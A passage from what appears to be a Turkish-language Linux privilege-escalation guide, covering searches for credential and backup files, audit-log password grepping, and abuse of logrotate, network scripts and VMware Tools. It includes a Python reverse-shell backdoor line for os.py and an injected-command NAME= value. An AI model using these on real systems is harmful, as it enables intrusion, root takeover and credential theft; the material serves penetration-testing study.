find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binary'ler**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Şifre içeren bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu okuyun; **şifre içerebilecek birkaç olası dosyayı** arar.\
Bunu yapmak için kullanabileceğiniz **bir diğer ilginç araç**: Windows, Linux ve Mac için yerel bir bilgisayarda depolanan çok sayıda şifreyi almak amacıyla kullanılan open source bir uygulama olan [**LaZagne**](https://github.com/AlessandroZ/LaZagne).

### Günlükler

Günlükleri okuyabiliyorsanız, **içlerinde ilginç/gizli bilgiler** bulabilirsiniz. Günlük ne kadar tuhafsa, o kadar ilgi çekici olacaktır (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoor'lu?) **audit logları**, bu gönderide açıklandığı üzere: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/), **şifreleri audit logları içine kaydetmenize** olanak sağlayabilir.
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Logları okumak için** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **grubu** oldukça faydalı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca **name** içinde veya **content** içinde "**password**" kelimesini içeren dosyaları da kontrol etmelisiniz; ayrıca logların içindeki IP'leri ve e-postaları veya hash regex'lerini de kontrol edin.\
Bunların tamamının nasıl yapılacağını burada listelemeyeceğim; ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)'in gerçekleştirdiği son kontrolleri inceleyebilirsiniz.

## Writable files

### Python library hijacking

Bir python script'inin **nereden** çalıştırılacağını biliyorsanız ve o klasörün **içine yazabiliyorsanız** veya **python library'lerini değiştirebiliyorsanız**, OS library'sini değiştirip backdoor ekleyebilirsiniz (python script'inin çalıştırılacağı konuma yazabiliyorsanız os.py library'sini kopyalayıp yapıştırın).

**library'ye backdoor eklemek** için os.py library'sinin sonuna aşağıdaki satırı eklemeniz yeterlidir (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

`logrotate` içindeki bir güvenlik açığı, bir log dosyası veya üst dizinleri üzerinde **yazma izinlerine** sahip kullanıcıların potansiyel olarak yetki yükseltmesine olanak tanır. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'ın, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaları çalıştıracak şekilde manipüle edilebilmesidir. İzinleri yalnızca _/var/log_ içinde değil, log rotation uygulanan tüm dizinlerde de kontrol etmek önemlidir.

> [!TIP]
> Bu güvenlik açığı `logrotate` sürüm `3.18.0` ve daha eski sürümlerini etkiler

Güvenlik açığı hakkında daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile exploit edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile oldukça benzerdir. Bu nedenle logları değiştirebildiğinizi tespit ettiğinizde, bu logları kimin yönettiğini kontrol edin ve logları symlink'lerle değiştirerek yetki yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ içine **yazabiliyor** ve bir `ifcf-<whatever>` script'i oluşturabiliyor **veya** mevcut bir script'i **değiştirebiliyorsa**, **sisteminiz pwned** demektir.

Örneğin _ifcg-eth0_ gibi network script'leri network bağlantıları için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından \~source edilirler\~.

Benim durumumda, bu network script'lerindeki `NAME=` attribute'u doğru şekilde işlenmiyordu. İsimde **boşluk varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı** anlamına gelir.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, **klasik Linux servis yönetim sistemi** olan System V init (SysVinit) için **script** dosyalarını içerir. Bu dizin, servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için kullanılan scriptleri barındırır. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerindeki alternatif yol `/etc/rc.d/init.d` şeklindedir.

Öte yandan `/etc/init`, Ubuntu tarafından sunulan daha yeni bir **servis yönetimi** sistemi olan **Upstart** ile ilişkilidir ve servis yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'a geçiş yapılmış olmasına rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit scriptleri Upstart yapılandırmalarıyla birlikte kullanılmaya devam eder.

**systemd**, isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumu snapshot'ları gibi gelişmiş özellikler sunan modern bir initialization ve servis yöneticisi olarak ortaya çıkmıştır. Dosyaları dağıtım paketleri için `/usr/lib/systemd/`, yöneticilerin yaptığı değişiklikler için ise `/etc/systemd/system/` altında düzenleyerek sistem yönetimi sürecini kolaylaştırır.

## Diğer Teknikler

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden kaçış


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting framework'leri: manager-channel abuse

Android rooting framework'leri, ayrıcalıklı kernel işlevlerini bir userspace manager'a açığa çıkarmak için genellikle bir syscall'a hook ekler. Zayıf manager authentication (ör. FD sırasına dayalı signature kontrolleri veya zayıf parola şemaları), yerel bir uygulamanın manager'ı taklit etmesine ve zaten root edilmiş cihazlarda root yetkisine yükselmesine olanak sağlayabilir. Daha fazla bilgi ve exploitation ayrıntılarına buradan ulaşabilirsiniz:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Regex tabanlı exec aracılığıyla VMware Tools service discovery LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex tabanlı service discovery, process command line'larından bir binary path'i çıkarabilir ve bunu ayrıcalıklı bir context içinde -v ile çalıştırabilir. İzin verici pattern'ler (ör. \S kullanımı), writable konumlarda (ör. /tmp/httpd) attacker tarafından hazırlanmış listener'larla eşleşebilir ve root olarak execution'a yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgiye ve diğer discovery/monitoring stack'lerine uygulanabilecek genelleştirilmiş bir pattern'e buradan ulaşabilirsiniz:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Araçları

### **Linux local privilege escalation vector'lerini aramak için en iyi tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'teki kernel zaafiyetlerini listeler [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla script derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: cron tarafından çalıştırılan monitor için forged .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (log'lar aracılığıyla bash arithmetic injection, genel chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (etkileşimsiz startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
